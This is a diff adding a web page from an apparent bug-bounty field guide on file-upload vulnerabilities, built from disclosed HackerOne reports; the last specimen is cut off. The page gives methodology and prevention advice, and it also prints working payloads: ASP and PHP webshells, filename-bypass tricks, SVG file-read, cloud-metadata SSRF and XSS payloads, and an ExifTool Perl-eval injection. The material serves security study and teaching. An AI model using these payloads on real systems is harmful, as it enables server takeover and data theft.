@@ -1,0 +1,1053 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>File Upload · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Attack surface</b><span class="sep">/</span><b>File Upload</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="on" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="on" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Attack surface</div>
+      <h1>File Upload</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>66</b></span><a class="chip lab" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>File upload</b></a></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>A file-upload vulnerability is any point where attacker-controlled <strong>bytes land on disk</strong> and then get <em>interpreted</em> — executed as a server-side script, rendered as active content, parsed by a media library, unpacked from an archive, or served inline to another user. The bug is almost never "the upload" itself; it is the <strong>disagreement between three layers</strong> — what the validator <em>checks</em>, what name/bytes the storage layer actually <em>writes</em>, and how the file is later <em>served or processed</em>. Any gap between those layers is your primitive.</p>
+<p>It matters because it is the shortest path from "authenticated user" to <strong>RCE</strong>: drop a <code>.php</code>/<code>.aspx</code>/<code>.jsp</code> shell into a web-served, script-executing directory and you own the box. When code execution isn't reachable, the same upload is still an XSS sink (inline SVG/HTML), a file-read/SSRF sink (ImageMagick), or a CSP-bypass primitive (same-origin JS). Treat "upload" broadly: a report-export filename, a JDBC connection string, an archive member, and an HTTP <code>PUT</code> are all upload sinks with no <code>&lt;input type=file&gt;</code> in sight.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Baseline a legit upload.</strong> Note the returned storage URL/path pattern and — critically — the response headers when you fetch the file back: <code>Content-Type</code>, <code>Content-Disposition</code>, <code>X-Content-Type-Options</code>.</li><li><strong>Locate the three layers.</strong> Determine what the validator checks (extension? MIME? magic bytes? client-side only?), what actually hits disk (name normalization, null-byte truncation, directory field), and whether the stored file is <em>served</em> and <em>how</em>.</li><li><strong>Probe the validator</strong> by swapping exactly one variable at a time — extension, trailing char, MIME, magic bytes — never several at once, so you know which control you defeated.</li><li><strong>Probe the storage/serve layer</strong> by requesting the file back and diffing: does <code>.php</code> execute? does the SVG render? is it <code>inline</code> or <code>attachment</code>? is it served from an executing origin?</li><li><strong>Pick the primitive</strong> the gaps hand you — executable-extension bypass, arbitrary path write, archive extraction, media-library coercion, or active-content-served-inline.</li><li><strong>Escalate to impact.</strong> Confirmation (<code>phpinfo()</code>, <code>alert(document.domain)</code>, an OOB hit) is not the finding; chain to command execution, ATO, or file read.</li></ol>
+<div class="pre" data-lang="http"># Fetch the stored file back and read the tells:
+Content-Type: image/svg+xml         # served as active content? -&gt; XSS
+Content-Disposition: inline         # inline, not attachment?   -&gt; XSS/HTML
+# (missing) X-Content-Type-Options  # no nosniff? -&gt; browser may MIME-sniff to HTML</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>The validator and the filesystem rarely see the same string. Windows/IIS trims trailing space and dot on write; many stacks truncate at a null byte; media libraries decide format by magic bytes, not extension. Every one of those is a validator-vs-reality gap you can wedge open.</div></div>
+<h2 class="sec" id="technique-variants"><span class="tick">§</span>Technique variants</h2>
+<p>Find which gap the target hands you, then use the matching primitive.</p>
+<h3 class="sub" id="executable-extension-bypass-webshell">Executable-extension bypass → webshell</h3>
+<p>The validator blacklists (or weakly whitelists) dynamic extensions but compares a string that differs from what lands on disk. Match the OS: on IIS/Windows a trailing space or dot is trimmed on write, and a null byte truncates the name; alt/case extensions dodge naive lists.</p>
+<div class="pre" data-lang="http"># multipart filename tricks — one per attempt, then GET the path back:
+Content-Disposition: form-data; name="file"; filename="shell.asp "     # IIS trims -&gt; shell.asp   (#506646)
+Content-Disposition: form-data; name="file"; filename="poc.asp\x00.png" # \x00 = raw 0x00 byte (Burp hex editor, NOT the text "%00") -&gt; poc.asp  (#2054184)
+Content-Disposition: form-data; name="file"; filename="shell.pHp5"     # case/alt: .phtml .phar .cer .asa
+Content-Disposition: form-data; name="file"; filename="shell.php.jpg"  # double extension</div>
+<p>Classic-ASP webshell body (IIS) and the invocation:</p>
+<div class="pre" data-lang="http"># body of the uploaded file:
+&lt;% Set s=Server.CreateObject("WScript.Shell"): Set e=s.exec("cmd /c "&amp;request("cmd")): Response.Write(e.StdOut.ReadAll) %&gt;
+# then run commands:
+GET /uploads/shell.asp?cmd=whoami HTTP/1.1
+Host: TARGET</div>
+<h3 class="sub" id="path-name-field-arbitrary-write-no-upload-form">Path/name-field arbitrary write (no upload form)</h3>
+<p>Whenever an endpoint takes a <strong>name/path field</strong> and a <strong>content field</strong> separately, you have arbitrary file write with no multipart parsing at all. Traverse to the web root and choose an executable extension, or point a client-controlled <code>directory</code>/<code>path</code>/<code>overrideLocalStorageUrl</code> field out of the upload dir.</p>
+<div class="pre" data-lang="http"># separate name + content params, traversal chooses webroot + extension  (#1356845, #1360593)
+POST /v1/backend1 HTTP/1.1
+Host: TARGET
+Content-Type: application/x-www-form-urlencoded
+
+CID=x&amp;action=set_metric_gw_selections&amp;account_name=/../../../var/www/php/shell.php&amp;data=&lt;?php system($_GET['c']);?&gt;
+# then: GET /shell.php?c=id</div>
+<div class="pre" data-lang="http"># client-controlled directory field -&gt; overwrite the app entrypoint  (#343726)
+Content-Disposition: form-data; name="upload_file"; filename="app.js"
+...MALICIOUS_JS...
+Content-Disposition: form-data; name="directory"
+
+../../
+# overwrite app.js -&gt; RCE on the next restart</div>
+<h3 class="sub" id="archive-content-package-extraction">Archive / content-package extraction</h3>
+<p>SCORM/IMS course uploads, theme/plugin installers, and ZIP/site imports extract archive members onto disk. If the extracted tree is web-served and executable types aren't filtered, smuggle a shell inside and reference it. Two extra tells: the unpredictable output path is usually <strong>leaked in a follow-up response</strong>, and a <em>failed</em> import often leaves the uploaded file on disk as residue. ZIP-slip (<code>..</code> in a member path) lives here too.</p>
+<div class="pre" data-lang="http"># SCORM zip: valid manifest that references your shell as a resource  (#1122791)
+imsmanifest.xml     # references shared/shell.aspx
+shared/shell.aspx   # &lt;%= command-exec webshell %&gt;
+# recover strCourseId from the edit-metadata response, then:
+GET /CServer/Courseware/&lt;COURSE_ID&gt;/shared/shell.aspx?cmd=whoami</div>
+<h3 class="sub" id="media-library-sinks-imagemagick-exiftool">Media-library sinks (ImageMagick / ExifTool)</h3>
+<p>Preview/thumbnail generators hand bytes to <strong>ImageMagick/Imagick</strong> or <strong>ExifTool</strong>, which detect format by <strong>magic bytes, not extension</strong>. Rename an SVG (or an MVG/MSL/PS/DjVu payload) to any accepted image extension: a "HEIC-only" code path still processes your SVG. <code>xlink:href</code> is a local-file-read/SSRF primitive; MVG/MSL delegates and ExifTool eval are RCE (ImageTragick family).</p>
+<div class="pre" data-lang="http"># SVG renamed to .heic -&gt; preview embeds the referenced file (CVE-2021-32802)  (#1261413)
+&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="500" height="500"&gt;
+  &lt;image x="0" y="0" width="500" height="500" xlink:href="/etc/passwd" /&gt;
+&lt;/svg&gt;
+# swap the href to http://COLLAB/ for SSRF, or http://169.254.169.254/... for cloud metadata</div>
+<p>An image polyglot that <strong>survives the resize/recompression pipeline</strong> beats "we process every image" defenses — match the server's exact output dimensions and JPEG quality (read them from the returned image metadata):</p>
+<div class="pre" data-lang="http"># .php-extension'd JPEG carrying a shell that survives 50x50 / 75% recompression  (#158148)
+&lt;crafted 50x50 75%-quality JPEG carrying &lt;?php system($_GET['c']); ?&gt;&gt;
+# then: GET /view/data/logos/shell_&lt;id&gt;.php?c=id</div>
+<h3 class="sub" id="svg-html-active-content-stored-xss">SVG / HTML active content → stored XSS</h3>
+<p>Any upload <strong>served inline</strong> with attacker-controlled bytes is an XSS sink; SVG is the prime vector because it is XML+script. Defeat a format allow-list by keeping SVG bytes under an image extension or MIME, or by a double extension the server content-sniffs (<code>x.svg.png</code>). Fires in whatever origin renders it — often an admin/partner panel, i.e. blind/stored, and cross-tenant when an app icon renders in every install.</p>
+<div class="pre" data-lang="http"># SVG with an event handler; upload as .png / image MIME to pass the format check  (#765679, #880099, #148853)
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/&gt;</div>
+<p>If the SVG passes through a sanitizer with an <strong>element/attribute whitelist</strong>, an XML entity/DOCTYPE/comment can flip the parser out of whitelist mode so <code>onload</code>/<code>&lt;script&gt;</code> survives:</p>
+<div class="pre" data-lang="http"># entity/DOCTYPE presence disables the attribute whitelist  (#232174, #299424)
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY elem ""&gt; ]&gt;
+&lt;svg onload="alert(document.domain);" height="16" width="16"&gt;&amp;elem;&lt;/svg&gt;</div>
+<h3 class="sub" id="same-origin-js-upload-csp-bypass">Same-origin JS upload → CSP bypass</h3>
+<p>When CSP is <code>script-src 'self'</code> but the upload endpoint serves files <strong>from the app origin with a script content-type</strong>, uploaded JS satisfies the policy. Load it with <code>&lt;script src&gt;</code> from any HTML-injection sink; if literal <code>&lt;script&gt;</code> is stripped, smuggle it inside an <code>iframe srcdoc</code> (HTML-entity-encoded).</p>
+<div class="pre" data-lang="http"># uploaded payload.js is same-origin -&gt; beats script-src 'self'  (#1380157)
+&lt;iframe srcdoc="&amp;#x3c;script src='/file-upload/&lt;UPLOAD_ID&gt;/payload.js?download'&gt;&lt;/script&gt;"&gt;</div>
+<h3 class="sub" id="upload-by-verb-and-desktop-client-sinks">Upload-by-verb and desktop-client sinks</h3>
+<p>No form needed: a writable HTTP <code>PUT</code>/WebDAV to the web root <em>is</em> file upload. Desktop clients that save user-supplied downloads are a parallel surface — a macOS client that omits the <code>com.apple.quarantine</code> xattr lets an auto-executing format (<code>.terminal</code>, <code>.command</code>, <code>.webloc</code>) run on open with no Gatekeeper prompt; a game engine that unpacks a save file into its library-load path loads an attacker DLL.</p>
+<div class="pre" data-lang="http"># fingerprint methods first (OPTIONS / Allow), then write to the web root  (#369581)
+PUT /shell.txt HTTP/1.1
+Host: TARGET
+Content-Length: 12
+Connection: close
+
+emitrani POC</div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Extension blacklist, raw-name compare</td><td>trailing space/dot — <code>shell.asp </code> — Windows/IIS trims on write</td><td>#506646</td></tr><tr><td>Extension check before storage</td><td>null-byte truncation — <code>poc.asp</code> + raw <code>0x00</code> + <code>.png</code> saved as <code>poc.asp</code> (send a literal null, not the text <code>%00</code>)</td><td>#2054184</td></tr><tr><td>Substring (<code>strstr</code>/contains) extension check</td><td>anchor-confusion — <code>test.HL1.dll</code> satisfies an <code>*.HL?</code> filter mid-path</td><td>#458842</td></tr><tr><td>Deny-list of extensions</td><td>Unicode-whitespace smuggling in the extension (CVE-2021-32708)</td><td>#1720822</td></tr><tr><td>Declared-type / MIME allow-list</td><td>image <code>Content-Type</code> or magic bytes on script/SVG payload; malformed multi-value header</td><td>#765679, #1019425</td></tr><tr><td>Extension whitelist + content sniff</td><td>double extension — <code>x.svg.png</code> sniffed and rendered as SVG</td><td>#998422</td></tr><tr><td>Media library "sanitizes" images</td><td>magic-byte sniff over extension — Imagick/ExifTool process real content</td><td>#1261413, #1154542</td></tr><tr><td>SVG element/attribute whitelist</td><td>XML entity/DOCTYPE/comment flips the sanitizer out of whitelist mode</td><td>#232174, #299424</td></tr><tr><td>Image resize/recompression as a "filter"</td><td>polyglot JPEG engineered to survive the exact 50x50/75% pipeline</td><td>#158148</td></tr><tr><td><code>.htaccess</code> upload deny-list</td><td>write <code>.htaccess</code> via internal copy from a federated share</td><td>#228825</td></tr><tr><td>Client-side-only extension/size check</td><td>intercept and change bytes/extension after JS validation</td><td>#1606957, #1850065</td></tr><tr><td>Archive import validation</td><td>extraction-failure residue leaves the uploaded PHP on disk</td><td>#236607, #1350444</td></tr></tbody></table></div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>A <code>phpinfo()</code> or a rendered <code>alert()</code> proves the primitive, not the impact. Take an executable-extension bypass all the way to a command in a query param, and take an inline-SVG XSS to cookie/CSRF theft, before you call it done — triage pays for demonstrated impact, not for "the file was accepted".</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>File upload is both a chain <strong>terminus</strong> (write → RCE) and a <strong>pivot</strong>:</p>
+<ul><li><strong>File-write → RCE via autorun</strong> — don't hunt a script-exec sink; write to a known autorun location instead: the Windows Startup folder (executes as SYSTEM on next logon, #683965), the web root, <code>cron</code>, <code>.bashrc</code>, or overwrite the app entrypoint (#343726).</li><li><strong>File-write → RCE via a code-loading management interface</strong> — write a file, then have a co-located service load it: a SQLite-JDBC file-write plus an unauthenticated <strong>Jolokia</strong> <code>jvmtiAgentLoad</code> on the written file loads it as a JVM agent (#1547877). Reach <code>localhost</code> with <a href="#">SSRF</a>.</li><li><strong>SVG upload → stored XSS → account takeover</strong> — inline-served SVG runs JS in the app origin; steal the session cookie or self-drive an account change. Cross-tenant when the icon renders in every admin that OAuth-authorizes the app (#232174) — see <a href="#">xss</a>.</li><li><strong>Same-origin JS upload → CSP bypass → full XSS</strong> (#1380157); <strong>ImageMagick preview → arbitrary file read / SSRF / cloud metadata</strong> (#1261413).</li><li><strong>Content-sniffing upload → phishing / cache-poisoning DoS</strong> when attacker HTML is served from a trusted origin.</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Allow-list extensions, anchored to the <em>end</em> of the <em>final stored</em> name</strong> — not <code>strstr</code>/contains (#458842), not the raw pre-normalization name. Re-derive the extension <strong>after</strong> the OS/storage layer trims trailing space/dot and truncates null bytes (#506646, #2054184, #1720822).</li><li><strong>Validate real content with magic bytes and a strict parser</strong>, not the declared type — but remember the double edge: the media library <em>also</em> sniffs content, so an SVG under <code>.png</code> still reaches Imagick/ExifTool. Disable the SVG/MVG/MSL/PS coders in ImageMagick policy.</li><li><strong>Store uploads outside the web root, on a separate no-exec sandbox origin</strong>, served as <code>Content-Disposition: attachment</code> with a fixed benign <code>Content-Type</code> and <code>X-Content-Type-Options: nosniff</code>. This defuses the SVG/HTML-XSS and CSP-bypass classes even if a bad file lands.</li><li><strong>Never build a destination path from a client field</strong> (<code>directory</code>/<code>path</code>/<code>overrideLocalStorageUrl</code>) and randomize the stored filename (#343726, #683965). Sandbox archive extraction, reject <code>..</code>/absolute member paths, and delete residue on failed imports (#236607).</li><li><strong>Disable dangerous HTTP methods</strong> (<code>PUT</code>/<code>DELETE</code>/WebDAV) at the server (#369581); apply the quarantine xattr to files a desktop client writes (#1019389).</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Burp Suite</strong> — Repeater to hand-craft the multipart filename/<code>Content-Type</code>; Intruder to fuzz the extension/whitespace/null-byte matrix.</li><li><strong>Upload Scanner</strong> (Burp extension) — automates the filename/MIME/magic-byte permutation set.</li><li><strong>exiftool</strong> and <strong>ImageMagick</strong> — craft and verify polyglots (bulletproof JPEGs, MVG/MSL payloads).</li><li><strong><code>xattr -p com.apple.quarantine</code></strong> — the Gatekeeper-bypass check on desktop-client-written files.</li><li><strong><code>curl -kvI</code> / TLS-cert inspection</strong> — fingerprint the appliance behind an IP to map it to a known unauth-write CVE.</li><li><strong>interactsh / any collaborator</strong> — OOB confirmation of blind writes and blind SSRF from media libraries.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>66</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-1154542" style="--sv:var(--sev-crit)" data-sev="4" data-votes="505" data-bounty="20000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>ExifTool DjVu annotation eval RCE via content-type sniffing</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1154542</b> · gitlab · 20000 · 505 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">GitLab Workhorse passed uploaded jpg/jpeg/tiff to ExifTool to strip metadata, but ExifTool identifies format by content not extension; a DjVu file whose annotation contains a backslash-newline escapes the quoted string and injects Perl that ExifTool eval()s.</p>
+<h4>Method</h4><ol><li>Craft a DjVu file whose (metadata (Copyright ...)) annotation breaks out with backslash+newline</li><li>Insert Perl qx{} to run a command / reverse shell</li><li>Rename it to .jpg so Workhorse forwards it to ExifTool</li><li>Upload as a snippet/description attachment; ExifTool sniffs DjVu and evals the injected Perl</li></ol>
+<div class="pre">(metadata
+	(Copyright "\
+" . qx{echo vakzz &gt;/tmp/vakzz} . \
+" b ") )</div>
+<p class="insight"><b>Insight —</b> File-parsing tools that detect type by magic bytes (ExifTool, ImageMagick, ffmpeg) massively expand attack surface: an image whitelist by extension is meaningless. Rename payloads to an allowed extension and target a dangerous parser (DjVu, PostScript) inside the tool.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1154542" target="_blank" rel="noopener">hackerone.com/reports/1154542</a></span><a class="src" href="#report-1154542" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-506646" style="--sv:var(--sev-crit)" data-sev="4" data-votes="687" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Extension-blacklist bypass with trailing space -&gt; ASP webshell on IIS</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#506646</b> · starbucks · awarded · 687 votes · resolved</div>
+<div class="taxo"><span>Program <b>starbucks</b></span><span>Surface <b>web</b></span><span>Chain <b>upload filter bypass -&gt; webshell -&gt; arbitrary OS comma</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Upload filter blacklists dynamic extensions but compares the raw filename; appending a trailing space ("asp ") passes the check, while Windows/IIS strips the trailing space when saving, leaving an executable .asp file.</p>
+<h4>Method</h4><ol><li>Intercept the avatar/resume upload request in Burp.</li><li>Change filename from x.jpg to x.asp&lt;space&gt; (trailing space after the extension) and set webshell content.</li><li>Server saves it as x.asp (space trimmed); browse to the uploaded path with a command in a query param.</li></ol>
+<div class="pre"># multipart filename with trailing space defeats the blacklist:
+Content-Disposition: form-data; name="file"; filename="shell.asp "
+
+# then invoke the dropped webshell:
+GET /recruitjob/tempfiles/temp_uploaded_&lt;uuid&gt;.asp?getsc=dir%20d:\path%20%2fs HTTP/1.1</div>
+<p class="insight"><b>Insight —</b> On Windows/IIS targets, trailing space or dot in the upload filename ("asp ", "asp.") bypasses naive extension blacklists because the OS normalizes the name on write. Always fuzz upload filters with trailing whitespace/dots, case, and double extensions.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/506646" target="_blank" rel="noopener">hackerone.com/reports/506646</a></span><a class="src" href="#report-506646" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1072832" style="--sv:var(--sev-crit)" data-sev="4" data-votes="104" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Report engine arbitrary file write (rdExportFilename) -&gt; aspx webshell</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1072832</b> · deptofdefense · awarded · 104 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>Report export -&gt; controlled filename+content -&gt; aspx w</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A Logi Analytics reporting endpoint (rdPage.aspx) let the export request control both the output filename/path (rdExportFilename) and the file contents (rdReportName), allowing an authenticated user to write a .aspx webshell into a web-served directory.</p>
+<h4>Method</h4><ol><li>Run any report and intercept the Export-to-Excel POST to /RServer/rdPage.aspx</li><li>Set rdReportFormat/rdExcelOutputFormat=NativeExcel</li><li>Set rdExportFilename to shell.aspx</li><li>Set rdReportName (POST body) to a URL-encoded C# aspx webshell that runs cmd.exe from a query param</li><li>Forward; browse the written .aspx path and pass ?param=whoami</li></ol>
+<div class="pre">rdExportFilename=shell.aspx
